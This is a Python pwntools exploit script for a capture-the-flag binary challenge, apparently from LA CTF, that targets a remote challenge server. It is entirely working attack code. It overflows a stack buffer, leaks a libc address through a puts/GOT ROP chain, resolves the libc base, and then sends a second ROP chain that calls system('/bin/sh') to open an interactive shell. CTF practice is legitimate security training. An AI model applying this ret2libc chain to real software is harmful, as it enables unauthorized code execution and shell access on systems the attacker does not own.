#! /usr/bin/python

from pwn import *

context.update(
        arch="amd64",
        #arch="i386",
        endian="little",
        log_level="debug",
        os="linux",
        #terminal=["tmux", "split-window", "-h", "-p 65"]
        terminal=["st"]
)

def start(binary):

    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
    '''


    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("chall.lac.tf", 31284)
    else:
        return process(binary)

def exploit(p,e,r,l):
    pad = b"A" * 56 + p64(e.got["puts"]) + b"B" * 8 
    chain = p64(e.plt["puts"]) + p64(e.sym["main"])

    p.sendline(pad+chain)
    
    p.recvline()
    leak = u64(p.recvline().strip().ljust(8,b"\x00"))
    log.info(f"Leaked libc {hex(leak)}")
    libc_base = leak - l.sym["puts"]
    log.info(f"Resolved libc base {hex(libc_base)}")

    pad = b"A" * 72  

    r = ROP(l)

    chain = p64(libc_base + r.find_gadget(["pop rdi", "ret"])[0]) + p64(libc_base + next(l.search(b"/bin/sh\x00")))
    chain += p64(e.sym["_fini"]) + p64(libc_base + l.sym["system"])
    
    p.sendline(pad+chain)

    p.interactive()

if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)
    l = ELF("./libc.so.6")

    exploit(p,e,r,l)
